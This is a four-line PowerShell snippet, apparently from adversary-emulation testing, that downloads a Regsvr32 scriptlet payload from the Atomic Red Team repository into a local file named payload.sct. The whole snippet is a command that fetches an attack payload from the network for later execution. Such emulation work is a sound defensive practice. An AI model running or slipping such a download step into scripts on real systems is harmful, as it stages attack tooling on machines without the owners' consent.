$url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/RegSvr32.sct"
$out = "D:\tmp\payload.sct"
$dm = New-Object System.Net.WebClient
$dm.DownloadFile($url, $out)